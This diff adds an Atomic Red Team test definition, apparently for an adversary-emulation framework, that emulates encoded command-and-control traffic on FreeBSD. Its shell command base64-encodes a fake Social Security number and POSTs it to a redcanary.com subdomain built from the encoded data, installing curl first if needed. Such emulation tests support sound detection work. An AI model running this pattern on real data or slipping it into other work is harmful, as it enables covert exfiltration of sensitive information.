@@ -1,0 +1,44 @@
+- id: 2d97c626-7652-449e-a986-b02d9051c298
+  name: Base64 Encoded data (freebsd)
+  description: Utilizing a common technique for posting base64 encoded data.
+  tactic: command-and-control
+  technique:
+    attack_id: T1132.001
+    name: 'Data Encoding: Standard Encoding'
+  platforms:
+    linux:
+      sh:
+        command: 'if [ -x "$(command -v curl)" ]; then : ; else pkg install -y curl;
+          fi; echo -n 111-11-1111 | b64encode -r -; curl -XPOST MTExLTExLTExMTE=.redcanary.com'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1132.001
+  - atomic-red-team
+  - command-and-control
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      destination_url:
+        description: Destination URL to post encoded data.
+        type: url
+        default: redcanary.com
+      base64_data:
+        description: Encoded data to post using fake Social Security number 111-11-1111.
+        type: string
+        default: MTExLTExLTExMTE=
+    dependencies:
+    - description: 'Requires curl
+
+        '
+      prereq_command: "if [ -x \"$(command -v curl)\" ]; then exit 0; else exit 1;\
+        \ fi;      \n"
+      get_prereq_command: 'pkg install -y curl
+
+        '
+    technique_created: '2020-03-14T23:36:52.095Z'
+    atomic_guid: 2d97c626-7652-449e-a986-b02d9051c298
+    import_timestamp: '2025-06-24T11:15:56.220534Z'
